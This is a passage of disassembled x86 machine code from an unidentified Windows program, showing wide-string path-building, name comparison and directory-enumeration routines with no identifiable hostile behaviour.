  401cf4:	ff 15 84 80 40 00    	call   *0x408084
  401cfa:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401cfd:	8b f0                	mov    %eax,%esi
  401cff:	8b 41 04             	mov    0x4(%ecx),%eax
  401d02:	85 c0                	test   %eax,%eax
  401d04:	74 0f                	je     0x401d15
  401d06:	8b 10                	mov    (%eax),%edx
  401d08:	66 83 3a 00          	cmpw   $0x0,(%edx)
  401d0c:	74 2c                	je     0x401d3a
  401d0e:	8b 40 04             	mov    0x4(%eax),%eax
  401d11:	85 c0                	test   %eax,%eax
  401d13:	75 f1                	jne    0x401d06
  401d15:	33 c0                	xor    %eax,%eax
  401d17:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401d1b:	89 06                	mov    %eax,(%esi)
  401d1d:	8b 45 0c             	mov    0xc(%ebp),%eax
  401d20:	89 46 04             	mov    %eax,0x4(%esi)
  401d23:	89 4e 08             	mov    %ecx,0x8(%esi)
  401d26:	8b 07                	mov    (%edi),%eax
  401d28:	85 c0                	test   %eax,%eax
  401d2a:	74 12                	je     0x401d3e
  401d2c:	50                   	push   %eax
  401d2d:	6a 00                	push   $0x0
  401d2f:	ff d3                	call   *%ebx
  401d31:	50                   	push   %eax
  401d32:	ff 15 84 80 40 00    	call   *0x408084
  401d38:	eb 06                	jmp    0x401d40
  401d3a:	8b c2                	mov    %edx,%eax
  401d3c:	eb d9                	jmp    0x401d17
  401d3e:	33 c0                	xor    %eax,%eax
  401d40:	89 46 0c             	mov    %eax,0xc(%esi)
  401d43:	8b 17                	mov    (%edi),%edx
  401d45:	8b 44 24 18          	mov    0x18(%esp),%eax
  401d49:	89 56 10             	mov    %edx,0x10(%esi)
  401d4c:	8b 08                	mov    (%eax),%ecx
  401d4e:	8b 15 88 b2 41 00    	mov    0x41b288,%edx
  401d54:	33 c0                	xor    %eax,%eax
  401d56:	52                   	push   %edx
  401d57:	89 4e 14             	mov    %ecx,0x14(%esi)
  401d5a:	8b 0e                	mov    (%esi),%ecx
  401d5c:	89 46 18             	mov    %eax,0x18(%esi)
  401d5f:	89 46 1c             	mov    %eax,0x1c(%esi)
  401d62:	8b 44 24 14          	mov    0x14(%esp),%eax
  401d66:	50                   	push   %eax
  401d67:	a1 24 90 41 00       	mov    0x419024,%eax
  401d6c:	c6 46 20 01          	movb   $0x1,0x20(%esi)
  401d70:	c6 46 21 00          	movb   $0x0,0x21(%esi)
  401d74:	8b 51 18             	mov    0x18(%ecx),%edx
  401d77:	52                   	push   %edx
  401d78:	50                   	push   %eax
  401d79:	8d 8e 2a 00 01 00    	lea    0x1002a(%esi),%ecx
  401d7f:	51                   	push   %ecx
  401d80:	ff 15 88 81 40 00    	call   *0x408188
  401d86:	83 c4 14             	add    $0x14,%esp
  401d89:	e8 52 11 00 00       	call   0x402ee0
  401d8e:	85 c0                	test   %eax,%eax
  401d90:	74 0a                	je     0x401d9c
  401d92:	8b 3e                	mov    (%esi),%edi
  401d94:	50                   	push   %eax
  401d95:	e8 56 0e 00 00       	call   0x402bf0
  401d9a:	eb 02                	jmp    0x401d9e
  401d9c:	33 c0                	xor    %eax,%eax
  401d9e:	85 c0                	test   %eax,%eax
  401da0:	89 46 28             	mov    %eax,0x28(%esi)
  401da3:	75 05                	jne    0x401daa
  401da5:	e8 26 48 00 00       	call   0x4065d0
  401daa:	6a 00                	push   $0x0
  401dac:	6a 00                	push   $0x0
  401dae:	56                   	push   %esi
  401daf:	68 20 26 40 00       	push   $0x402620
  401db4:	6a 00                	push   $0x0
  401db6:	6a 00                	push   $0x0
  401db8:	ff 15 14 81 40 00    	call   *0x408114
  401dbe:	8b f8                	mov    %eax,%edi
  401dc0:	6a ff                	push   $0xffffffff
  401dc2:	57                   	push   %edi
  401dc3:	ff 15 10 81 40 00    	call   *0x408110
  401dc9:	57                   	push   %edi
  401dca:	ff 15 48 81 40 00    	call   *0x408148
  401dd0:	8b 46 0c             	mov    0xc(%esi),%eax
  401dd3:	50                   	push   %eax
  401dd4:	6a 00                	push   $0x0
  401dd6:	ff d3                	call   *%ebx
  401dd8:	8b 3d 8c 80 40 00    	mov    0x40808c,%edi
  401dde:	50                   	push   %eax
  401ddf:	ff d7                	call   *%edi
  401de1:	56                   	push   %esi
  401de2:	6a 00                	push   $0x0
  401de4:	ff d3                	call   *%ebx
  401de6:	50                   	push   %eax
  401de7:	ff d7                	call   *%edi
  401de9:	8b 54 24 10          	mov    0x10(%esp),%edx
  401ded:	52                   	push   %edx
  401dee:	6a 00                	push   $0x0
  401df0:	ff d3                	call   *%ebx
  401df2:	50                   	push   %eax
  401df3:	ff d7                	call   *%edi
  401df5:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401df9:	50                   	push   %eax
  401dfa:	6a 00                	push   $0x0
  401dfc:	ff d3                	call   *%ebx
  401dfe:	50                   	push   %eax
  401dff:	ff d7                	call   *%edi
  401e01:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401e05:	51                   	push   %ecx
  401e06:	6a 00                	push   $0x0
  401e08:	ff d3                	call   *%ebx
  401e0a:	50                   	push   %eax
  401e0b:	ff d7                	call   *%edi
  401e0d:	5f                   	pop    %edi
  401e0e:	5e                   	pop    %esi
  401e0f:	5b                   	pop    %ebx
  401e10:	8b e5                	mov    %ebp,%esp
  401e12:	5d                   	pop    %ebp
  401e13:	c2 08 00             	ret    $0x8
  401e16:	cc                   	int3
  401e17:	cc                   	int3
  401e18:	cc                   	int3
  401e19:	cc                   	int3
  401e1a:	cc                   	int3
  401e1b:	cc                   	int3
  401e1c:	cc                   	int3
  401e1d:	cc                   	int3
  401e1e:	cc                   	int3
  401e1f:	cc                   	int3
  401e20:	8b 0d 4c b2 41 00    	mov    0x41b24c,%ecx
  401e26:	8b 41 04             	mov    0x4(%ecx),%eax
  401e29:	83 ec 08             	sub    $0x8,%esp
  401e2c:	53                   	push   %ebx
  401e2d:	57                   	push   %edi
  401e2e:	33 ff                	xor    %edi,%edi
  401e30:	3b c7                	cmp    %edi,%eax
  401e32:	74 0e                	je     0x401e42
  401e34:	83 39 02             	cmpl   $0x2,(%ecx)
  401e37:	7e 09                	jle    0x401e42
  401e39:	8b 50 08             	mov    0x8(%eax),%edx
  401e3c:	89 54 24 08          	mov    %edx,0x8(%esp)
  401e40:	eb 06                	jmp    0x401e48
  401e42:	89 7c 24 08          	mov    %edi,0x8(%esp)
  401e46:	8b d7                	mov    %edi,%edx
  401e48:	3b c7                	cmp    %edi,%eax
  401e4a:	74 0e                	je     0x401e5a
  401e4c:	83 39 03             	cmpl   $0x3,(%ecx)
  401e4f:	7e 09                	jle    0x401e5a
  401e51:	8b 40 0c             	mov    0xc(%eax),%eax
  401e54:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401e58:	eb 04                	jmp    0x401e5e
  401e5a:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  401e5e:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  401e62:	8b cb                	mov    %ebx,%ecx
  401e64:	66 8b 01             	mov    (%ecx),%ax
  401e67:	83 c1 02             	add    $0x2,%ecx
  401e6a:	66 85 c0             	test   %ax,%ax
  401e6d:	75 f5                	jne    0x401e64
  401e6f:	8b c2                	mov    %edx,%eax
  401e71:	56                   	push   %esi
  401e72:	66 8b 30             	mov    (%eax),%si
  401e75:	83 c0 02             	add    $0x2,%eax
  401e78:	66 85 f6             	test   %si,%si
  401e7b:	75 f5                	jne    0x401e72
  401e7d:	2b c2                	sub    %edx,%eax
  401e7f:	2b cb                	sub    %ebx,%ecx
  401e81:	d1 f8                	sar    $1,%eax
  401e83:	d1 f9                	sar    $1,%ecx
  401e85:	8d 74 08 ff          	lea    -0x1(%eax,%ecx,1),%esi
  401e89:	55                   	push   %ebp
  401e8a:	8d 2c 36             	lea    (%esi,%esi,1),%ebp
  401e8d:	3b ef                	cmp    %edi,%ebp
  401e8f:	74 11                	je     0x401ea2
  401e91:	55                   	push   %ebp
  401e92:	57                   	push   %edi
  401e93:	ff 15 90 80 40 00    	call   *0x408090
  401e99:	50                   	push   %eax
  401e9a:	ff 15 84 80 40 00    	call   *0x408084
  401ea0:	8b f8                	mov    %eax,%edi
  401ea2:	8b c3                	mov    %ebx,%eax
  401ea4:	8b d7                	mov    %edi,%edx
  401ea6:	8b de                	mov    %esi,%ebx
  401ea8:	2b d0                	sub    %eax,%edx
  401eaa:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  401eb0:	0f b7 08             	movzwl (%eax),%ecx
  401eb3:	66 89 0c 02          	mov    %cx,(%edx,%eax,1)
  401eb7:	83 c0 02             	add    $0x2,%eax
  401eba:	66 85 c9             	test   %cx,%cx
  401ebd:	74 05                	je     0x401ec4
  401ebf:	83 eb 01             	sub    $0x1,%ebx
  401ec2:	75 ec                	jne    0x401eb0
  401ec4:	85 db                	test   %ebx,%ebx
  401ec6:	75 05                	jne    0x401ecd
  401ec8:	66 89 5c 2f fe       	mov    %bx,-0x2(%edi,%ebp,1)
  401ecd:	85 f6                	test   %esi,%esi
  401ecf:	8b 54 24 10          	mov    0x10(%esp),%edx
  401ed3:	8b c7                	mov    %edi,%eax
  401ed5:	76 10                	jbe    0x401ee7
  401ed7:	66 83 38 00          	cmpw   $0x0,(%eax)
  401edb:	74 08                	je     0x401ee5
  401edd:	83 c0 02             	add    $0x2,%eax
  401ee0:	83 ee 01             	sub    $0x1,%esi
  401ee3:	75 f2                	jne    0x401ed7
  401ee5:	85 f6                	test   %esi,%esi
  401ee7:	74 26                	je     0x401f0f
  401ee9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  401ef0:	0f b7 0a             	movzwl (%edx),%ecx
  401ef3:	66 89 08             	mov    %cx,(%eax)
  401ef6:	83 c0 02             	add    $0x2,%eax
  401ef9:	83 c2 02             	add    $0x2,%edx
  401efc:	66 85 c9             	test   %cx,%cx
  401eff:	74 05                	je     0x401f06
  401f01:	83 ee 01             	sub    $0x1,%esi
  401f04:	75 ea                	jne    0x401ef0
  401f06:	85 f6                	test   %esi,%esi
  401f08:	75 05                	jne    0x401f0f
  401f0a:	66 89 74 2f fe       	mov    %si,-0x2(%edi,%ebp,1)
  401f0f:	57                   	push   %edi
  401f10:	ff 15 08 81 40 00    	call   *0x408108
  401f16:	57                   	push   %edi
  401f17:	8b 3d 90 80 40 00    	mov    0x408090,%edi
  401f1d:	6a 00                	push   $0x0
  401f1f:	89 44 24 18          	mov    %eax,0x18(%esp)
  401f23:	ff d7                	call   *%edi
  401f25:	50                   	push   %eax
  401f26:	ff 15 8c 80 40 00    	call   *0x40808c
  401f2c:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  401f30:	8b c5                	mov    %ebp,%eax
  401f32:	66 8b 08             	mov    (%eax),%cx
  401f35:	83 c0 02             	add    $0x2,%eax
  401f38:	66 85 c9             	test   %cx,%cx
  401f3b:	75 f5                	jne    0x401f32
  401f3d:	8b 54 24 14          	mov    0x14(%esp),%edx
  401f41:	8b ca                	mov    %edx,%ecx
  401f43:	66 8b 31             	mov    (%ecx),%si
  401f46:	83 c1 02             	add    $0x2,%ecx
  401f49:	66 85 f6             	test   %si,%si
  401f4c:	75 f5                	jne    0x401f43
  401f4e:	2b c5                	sub    %ebp,%eax
  401f50:	2b ca                	sub    %edx,%ecx
  401f52:	d1 f8                	sar    $1,%eax
  401f54:	d1 f9                	sar    $1,%ecx
  401f56:	8d 74 01 ff          	lea    -0x1(%ecx,%eax,1),%esi
  401f5a:	8d 04 36             	lea    (%esi,%esi,1),%eax
  401f5d:	85 c0                	test   %eax,%eax
  401f5f:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401f63:	74 10                	je     0x401f75
  401f65:	50                   	push   %eax
  401f66:	6a 00                	push   $0x0
  401f68:	ff d7                	call   *%edi
  401f6a:	50                   	push   %eax
  401f6b:	ff 15 84 80 40 00    	call   *0x408084
  401f71:	8b f8                	mov    %eax,%edi
  401f73:	eb 02                	jmp    0x401f77
  401f75:	33 ff                	xor    %edi,%edi
  401f77:	8b d7                	mov    %edi,%edx
  401f79:	8b c5                	mov    %ebp,%eax
  401f7b:	2b d5                	sub    %ebp,%edx
  401f7d:	8b de                	mov    %esi,%ebx
  401f7f:	5d                   	pop    %ebp
  401f80:	0f b7 08             	movzwl (%eax),%ecx
  401f83:	66 89 0c 02          	mov    %cx,(%edx,%eax,1)
  401f87:	83 c0 02             	add    $0x2,%eax
  401f8a:	66 85 c9             	test   %cx,%cx
  401f8d:	74 05                	je     0x401f94
  401f8f:	83 eb 01             	sub    $0x1,%ebx
  401f92:	75 ec                	jne    0x401f80
  401f94:	85 db                	test   %ebx,%ebx
  401f96:	75 09                	jne    0x401fa1
  401f98:	8b 54 24 18          	mov    0x18(%esp),%edx
  401f9c:	66 89 5c 3a fe       	mov    %bx,-0x2(%edx,%edi,1)
  401fa1:	85 f6                	test   %esi,%esi
  401fa3:	8b 54 24 10          	mov    0x10(%esp),%edx
  401fa7:	8b c7                	mov    %edi,%eax
  401fa9:	76 15                	jbe    0x401fc0
  401fab:	eb 03                	jmp    0x401fb0
  401fad:	8d 49 00             	lea    0x0(%ecx),%ecx
  401fb0:	66 83 38 00          	cmpw   $0x0,(%eax)
  401fb4:	74 08                	je     0x401fbe
  401fb6:	83 c0 02             	add    $0x2,%eax
  401fb9:	83 ee 01             	sub    $0x1,%esi
  401fbc:	75 f2                	jne    0x401fb0
  401fbe:	85 f6                	test   %esi,%esi
  401fc0:	74 23                	je     0x401fe5
  401fc2:	0f b7 0a             	movzwl (%edx),%ecx
  401fc5:	66 89 08             	mov    %cx,(%eax)
  401fc8:	83 c0 02             	add    $0x2,%eax
  401fcb:	83 c2 02             	add    $0x2,%edx
  401fce:	66 85 c9             	test   %cx,%cx
  401fd1:	74 05                	je     0x401fd8
  401fd3:	83 ee 01             	sub    $0x1,%esi
  401fd6:	75 ea                	jne    0x401fc2
  401fd8:	85 f6                	test   %esi,%esi
  401fda:	75 09                	jne    0x401fe5
  401fdc:	8b 44 24 18          	mov    0x18(%esp),%eax
  401fe0:	66 89 74 38 fe       	mov    %si,-0x2(%eax,%edi,1)
  401fe5:	57                   	push   %edi
  401fe6:	ff 15 08 81 40 00    	call   *0x408108
  401fec:	57                   	push   %edi
  401fed:	6a 00                	push   $0x0
  401fef:	8b d8                	mov    %eax,%ebx
  401ff1:	ff 15 90 80 40 00    	call   *0x408090
  401ff7:	50                   	push   %eax
  401ff8:	ff 15 8c 80 40 00    	call   *0x40808c
  401ffe:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402002:	83 f8 ff             	cmp    $0xffffffff,%eax
  402005:	5e                   	pop    %esi
  402006:	74 16                	je     0x40201e
  402008:	a8 10                	test   $0x10,%al
  40200a:	74 12                	je     0x40201e
  40200c:	83 fb ff             	cmp    $0xffffffff,%ebx
  40200f:	74 0d                	je     0x40201e
  402011:	f6 c3 10             	test   $0x10,%bl
  402014:	75 08                	jne    0x40201e
  402016:	5f                   	pop    %edi
  402017:	b0 01                	mov    $0x1,%al
  402019:	5b                   	pop    %ebx
  40201a:	83 c4 08             	add    $0x8,%esp
  40201d:	c3                   	ret
  40201e:	5f                   	pop    %edi
  40201f:	32 c0                	xor    %al,%al
  402021:	5b                   	pop    %ebx
  402022:	83 c4 08             	add    $0x8,%esp
  402025:	c3                   	ret
  402026:	cc                   	int3
  402027:	cc                   	int3
  402028:	cc                   	int3
  402029:	cc                   	int3
  40202a:	cc                   	int3
  40202b:	cc                   	int3
  40202c:	cc                   	int3
  40202d:	cc                   	int3
  40202e:	cc                   	int3
  40202f:	cc                   	int3
  402030:	53                   	push   %ebx
  402031:	55                   	push   %ebp
  402032:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  402036:	56                   	push   %esi
  402037:	57                   	push   %edi
  402038:	8b cd                	mov    %ebp,%ecx
  40203a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402040:	66 8b 01             	mov    (%ecx),%ax
  402043:	83 c1 02             	add    $0x2,%ecx
  402046:	66 85 c0             	test   %ax,%ax
  402049:	75 f5                	jne    0x402040
  40204b:	eb 03                	jmp    0x402050
  40204d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402050:	83 e9 02             	sub    $0x2,%ecx
  402053:	3b cd                	cmp    %ebp,%ecx
  402055:	74 08                	je     0x40205f
  402057:	66 83 39 5c          	cmpw   $0x5c,(%ecx)
  40205b:	75 f3                	jne    0x402050
  40205d:	eb 06                	jmp    0x402065
  40205f:	66 83 39 5c          	cmpw   $0x5c,(%ecx)
  402063:	75 52                	jne    0x4020b7
  402065:	8b 1d 4c b2 41 00    	mov    0x41b24c,%ebx
  40206b:	8b 73 04             	mov    0x4(%ebx),%esi
  40206e:	85 f6                	test   %esi,%esi
  402070:	74 09                	je     0x40207b
  402072:	83 3b 00             	cmpl   $0x0,(%ebx)
  402075:	7e 04                	jle    0x40207b
  402077:	8b 06                	mov    (%esi),%eax
  402079:	eb 02                	jmp    0x40207d
  40207b:	33 c0                	xor    %eax,%eax
  40207d:	8d 79 02             	lea    0x2(%ecx),%edi
  402080:	8b d7                	mov    %edi,%edx
  402082:	e8 69 1f 00 00       	call   0x403ff0
  402087:	85 c0                	test   %eax,%eax
  402089:	74 1b                	je     0x4020a6
  40208b:	85 f6                	test   %esi,%esi
  40208d:	74 0a                	je     0x402099
  40208f:	83 3b 01             	cmpl   $0x1,(%ebx)
  402092:	7e 05                	jle    0x402099
  402094:	8b 46 04             	mov    0x4(%esi),%eax
  402097:	eb 02                	jmp    0x40209b
  402099:	33 c0                	xor    %eax,%eax
  40209b:	8b d7                	mov    %edi,%edx
  40209d:	e8 4e 1f 00 00       	call   0x403ff0
  4020a2:	85 c0                	test   %eax,%eax
  4020a4:	75 11                	jne    0x4020b7
  4020a6:	55                   	push   %ebp
  4020a7:	e8 74 fd ff ff       	call   0x401e20
  4020ac:	83 c4 04             	add    $0x4,%esp
  4020af:	84 c0                	test   %al,%al
  4020b1:	0f 85 92 00 00 00    	jne    0x402149
  4020b7:	66 83 3d 28 90 41 00 	cmpw   $0x0,0x419028
  4020be:	00 
  4020bf:	74 10                	je     0x4020d1
  4020c1:	b8 28 90 41 00       	mov    $0x419028,%eax
  4020c6:	8b d5                	mov    %ebp,%edx
  4020c8:	e8 23 1f 00 00       	call   0x403ff0
  4020cd:	85 c0                	test   %eax,%eax
  4020cf:	74 78                	je     0x402149
  4020d1:	a1 5c b2 41 00       	mov    0x41b25c,%eax
  4020d6:	8b d5                	mov    %ebp,%edx
  4020d8:	e8 13 1f 00 00       	call   0x403ff0
  4020dd:	85 c0                	test   %eax,%eax
  4020df:	74 68                	je     0x402149
  4020e1:	a1 44 b2 41 00       	mov    0x41b244,%eax
  4020e6:	8b d5                	mov    %ebp,%edx
  4020e8:	e8 03 1f 00 00       	call   0x403ff0
  4020ed:	85 c0                	test   %eax,%eax
  4020ef:	74 58                	je     0x402149
  4020f1:	8b c5                	mov    %ebp,%eax
  4020f3:	8d 50 02             	lea    0x2(%eax),%edx
  4020f6:	66 8b 08             	mov    (%eax),%cx
  4020f9:	83 c0 02             	add    $0x2,%eax
  4020fc:	66 85 c9             	test   %cx,%cx
  4020ff:	75 f5                	jne    0x4020f6
  402101:	2b c2                	sub    %edx,%eax
  402103:	d1 f8                	sar    $1,%eax
  402105:	83 f8 03             	cmp    $0x3,%eax
  402108:	76 11                	jbe    0x40211b
  40210a:	a1 34 b2 41 00       	mov    0x41b234,%eax
  40210f:	8d 7d 06             	lea    0x6(%ebp),%edi
  402112:	e8 59 0f 00 00       	call   0x403070
  402117:	84 c0                	test   %al,%al
  402119:	75 2e                	jne    0x402149
  40211b:	80 7c 24 18 00       	cmpb   $0x0,0x18(%esp)
  402120:	74 20                	je     0x402142
  402122:	a1 84 b2 41 00       	mov    0x41b284,%eax
  402127:	8b d5                	mov    %ebp,%edx
  402129:	e8 c2 1e 00 00       	call   0x403ff0
  40212e:	85 c0                	test   %eax,%eax
  402130:	74 17                	je     0x402149
  402132:	a1 78 b2 41 00       	mov    0x41b278,%eax
  402137:	8b d5                	mov    %ebp,%edx
  402139:	e8 b2 1e 00 00       	call   0x403ff0
  40213e:	85 c0                	test   %eax,%eax
  402140:	74 07                	je     0x402149
  402142:	5f                   	pop    %edi
  402143:	5e                   	pop    %esi
  402144:	5d                   	pop    %ebp
  402145:	32 c0                	xor    %al,%al
  402147:	5b                   	pop    %ebx
  402148:	c3                   	ret
  402149:	5f                   	pop    %edi
  40214a:	5e                   	pop    %esi
  40214b:	5d                   	pop    %ebp
  40214c:	b0 01                	mov    $0x1,%al
  40214e:	5b                   	pop    %ebx
  40214f:	c3                   	ret
  402150:	55                   	push   %ebp
  402151:	8d 6b 2c             	lea    0x2c(%ebx),%ebp
  402154:	8b c5                	mov    %ebp,%eax
  402156:	57                   	push   %edi
  402157:	8b c8                	mov    %eax,%ecx
  402159:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402160:	66 8b 10             	mov    (%eax),%dx
  402163:	83 c0 02             	add    $0x2,%eax
  402166:	66 85 d2             	test   %dx,%dx
  402169:	75 f5                	jne    0x402160
  40216b:	eb 03                	jmp    0x402170
  40216d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402170:	83 e8 02             	sub    $0x2,%eax
  402173:	3b c1                	cmp    %ecx,%eax
  402175:	74 0b                	je     0x402182
  402177:	66 83 38 2e          	cmpw   $0x2e,(%eax)
  40217b:	75 f3                	jne    0x402170
  40217d:	8d 78 02             	lea    0x2(%eax),%edi
  402180:	eb 0d                	jmp    0x40218f
  402182:	66 83 38 2e          	cmpw   $0x2e,(%eax)
  402186:	75 05                	jne    0x40218d
  402188:	8d 78 02             	lea    0x2(%eax),%edi
  40218b:	eb 02                	jmp    0x40218f
  40218d:	33 ff                	xor    %edi,%edi
  40218f:	f6 03 04             	testb  $0x4,(%ebx)
  402192:	74 05                	je     0x402199
  402194:	5f                   	pop    %edi
  402195:	32 c0                	xor    %al,%al
  402197:	5d                   	pop    %ebp
  402198:	c3                   	ret
  402199:	85 ff                	test   %edi,%edi
  40219b:	56                   	push   %esi
  40219c:	74 36                	je     0x4021d4
  40219e:	a1 38 b2 41 00       	mov    0x41b238,%eax
  4021a3:	8b 30                	mov    (%eax),%esi
  4021a5:	85 f6                	test   %esi,%esi
  4021a7:	74 1b                	je     0x4021c4
  4021a9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4021b0:	8b 16                	mov    (%esi),%edx
  4021b2:	8b c7                	mov    %edi,%eax
  4021b4:	e8 37 1e 00 00       	call   0x403ff0
  4021b9:	85 c0                	test   %eax,%eax
  4021bb:	74 4d                	je     0x40220a
  4021bd:	8b 76 04             	mov    0x4(%esi),%esi
  4021c0:	85 f6                	test   %esi,%esi
  4021c2:	75 ec                	jne    0x4021b0
  4021c4:	a1 88 b2 41 00       	mov    0x41b288,%eax
  4021c9:	8b d7                	mov    %edi,%edx
  4021cb:	e8 20 1e 00 00       	call   0x403ff0
  4021d0:	85 c0                	test   %eax,%eax
  4021d2:	74 36                	je     0x40220a
  4021d4:	83 7b 1c 00          	cmpl   $0x0,0x1c(%ebx)
  4021d8:	75 06                	jne    0x4021e0
  4021da:	83 7b 20 00          	cmpl   $0x0,0x20(%ebx)
  4021de:	74 2a                	je     0x40220a
  4021e0:	8b 0d 7c b2 41 00    	mov    0x41b27c,%ecx
  4021e6:	8b 31                	mov    (%ecx),%esi
  4021e8:	85 f6                	test   %esi,%esi
  4021ea:	74 18                	je     0x402204
  4021ec:	8d 64 24 00          	lea    0x0(%esp),%esp
  4021f0:	8b 16                	mov    (%esi),%edx
  4021f2:	8b c5                	mov    %ebp,%eax
  4021f4:	e8 f7 1d 00 00       	call   0x403ff0
  4021f9:	85 c0                	test   %eax,%eax
  4021fb:	74 0d                	je     0x40220a
  4021fd:	8b 76 04             	mov    0x4(%esi),%esi
  402200:	85 f6                	test   %esi,%esi
  402202:	75 ec                	jne    0x4021f0
  402204:	5e                   	pop    %esi
  402205:	5f                   	pop    %edi
  402206:	b0 01                	mov    $0x1,%al
  402208:	5d                   	pop    %ebp
  402209:	c3                   	ret
  40220a:	5e                   	pop    %esi
  40220b:	5f                   	pop    %edi
  40220c:	32 c0                	xor    %al,%al
  40220e:	5d                   	pop    %ebp
  40220f:	c3                   	ret
  402210:	55                   	push   %ebp
  402211:	8b ec                	mov    %esp,%ebp
  402213:	83 e4 f8             	and    $0xfffffff8,%esp
  402216:	a1 0c 90 40 00       	mov    0x40900c,%eax
  40221b:	81 ec 64 02 00 00    	sub    $0x264,%esp
  402221:	85 c0                	test   %eax,%eax
  402223:	53                   	push   %ebx
  402224:	56                   	push   %esi
  402225:	57                   	push   %edi
  402226:	74 11                	je     0x402239
  402228:	6a 00                	push   $0x0
  40222a:	50                   	push   %eax
  40222b:	ff 15 10 81 40 00    	call   *0x408110
  402231:	85 c0                	test   %eax,%eax
  402233:	0f 84 d5 03 00 00    	je     0x40260e
  402239:	8b 45 08             	mov    0x8(%ebp),%eax
  40223c:	0f b6 48 21          	movzbl 0x21(%eax),%ecx
  402240:	8b 55 0c             	mov    0xc(%ebp),%edx
  402243:	51                   	push   %ecx
  402244:	52                   	push   %edx
  402245:	e8 e6 fd ff ff       	call   0x402030
  40224a:	83 c4 08             	add    $0x8,%esp
  40224d:	84 c0                	test   %al,%al
  40224f:	0f 85 b9 03 00 00    	jne    0x40260e
  402255:	8b 5d 10             	mov    0x10(%ebp),%ebx
  402258:	8d 7b 08             	lea    0x8(%ebx),%edi
  40225b:	8d 04 3f             	lea    (%edi,%edi,1),%eax
  40225e:	85 c0                	test   %eax,%eax
  402260:	0f 84 a8 03 00 00    	je     0x40260e
  402266:	50                   	push   %eax
  402267:	6a 00                	push   $0x0
  402269:	ff 15 90 80 40 00    	call   *0x408090
  40226f:	50                   	push   %eax
  402270:	ff 15 84 80 40 00    	call   *0x408084
  402276:	8b f0                	mov    %eax,%esi
  402278:	85 f6                	test   %esi,%esi
  40227a:	0f 84 8e 03 00 00    	je     0x40260e
  402280:	8b 45 08             	mov    0x8(%ebp),%eax
  402283:	80 78 20 00          	cmpb   $0x0,0x20(%eax)
  402287:	75 34                	jne    0x4022bd
  402289:	81 fb fa 00 00 00    	cmp    $0xfa,%ebx
  40228f:	72 2c                	jb     0x4022bd
  402291:	8b 15 70 b2 41 00    	mov    0x41b270,%edx
  402297:	8b de                	mov    %esi,%ebx
  402299:	e8 92 1c 00 00       	call   0x403f30
  40229e:	8b 7d 10             	mov    0x10(%ebp),%edi
  4022a1:	8b 55 0c             	mov    0xc(%ebp),%edx
  4022a4:	83 c7 04             	add    $0x4,%edi
  4022a7:	8d 5e 08             	lea    0x8(%esi),%ebx
  4022aa:	e8 81 1c 00 00       	call   0x403f30
  4022af:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4022b2:	8d 5c 4e 06          	lea    0x6(%esi,%ecx,2),%ebx
  4022b6:	bf 05 00 00 00       	mov    $0x5,%edi
  4022bb:	eb 16                	jmp    0x4022d3
  4022bd:	8b 55 0c             	mov    0xc(%ebp),%edx
  4022c0:	8b de                	mov    %esi,%ebx
  4022c2:	e8 69 1c 00 00       	call   0x403f30
  4022c7:	8b 55 10             	mov    0x10(%ebp),%edx
  4022ca:	8d 5c 56 fe          	lea    -0x2(%esi,%edx,2),%ebx
  4022ce:	bf 09 00 00 00       	mov    $0x9,%edi
  4022d3:	ba cc 81 40 00       	mov    $0x4081cc,%edx
  4022d8:	e8 53 1c 00 00       	call   0x403f30
  4022dd:	8d 44 24 20          	lea    0x20(%esp),%eax
  4022e1:	50                   	push   %eax
  4022e2:	56                   	push   %esi
  4022e3:	ff 15 2c 81 40 00    	call   *0x40812c
  4022e9:	56                   	push   %esi
  4022ea:	8b f8                	mov    %eax,%edi
  4022ec:	33 f6                	xor    %esi,%esi
  4022ee:	56                   	push   %esi
  4022ef:	89 7c 24 24          	mov    %edi,0x24(%esp)
  4022f3:	ff 15 90 80 40 00    	call   *0x408090
  4022f9:	50                   	push   %eax
  4022fa:	ff 15 8c 80 40 00    	call   *0x40808c
  402300:	83 ff ff             	cmp    $0xffffffff,%edi
  402303:	75 1a                	jne    0x40231f
  402305:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402308:	51                   	push   %ecx
  402309:	ff 15 04 81 40 00    	call   *0x408104
  40230f:	50                   	push   %eax
  402310:	e8 bb 42 00 00       	call   0x4065d0
  402315:	83 c4 08             	add    $0x8,%esp
  402318:	5f                   	pop    %edi
  402319:	5e                   	pop    %esi
  40231a:	5b                   	pop    %ebx
  40231b:	8b e5                	mov    %ebp,%esp
  40231d:	5d                   	pop    %ebp
  40231e:	c3                   	ret
  40231f:	89 74 24 18          	mov    %esi,0x18(%esp)
  402323:	89 74 24 10          	mov    %esi,0x10(%esp)
  402327:	eb 07                	jmp    0x402330
  402329:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402330:	66 8b 44 24 4c       	mov    0x4c(%esp),%ax
  402335:	66 85 c0             	test   %ax,%ax
  402338:	0f 84 6e 02 00 00    	je     0x4025ac
  40233e:	66 3d 2e 00          	cmp    $0x2e,%ax
  402342:	75 20                	jne    0x402364
  402344:	66 8b 44 24 4e       	mov    0x4e(%esp),%ax
  402349:	66 85 c0             	test   %ax,%ax
  40234c:	0f 84 5a 02 00 00    	je     0x4025ac
  402352:	66 3d 2e 00          	cmp    $0x2e,%ax
  402356:	75 0c                	jne    0x402364
  402358:	66 83 7c 24 50 00    	cmpw   $0x0,0x50(%esp)
  40235e:	0f 84 48 02 00 00    	je     0x4025ac
  402364:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  402368:	eb 06                	jmp    0x402370
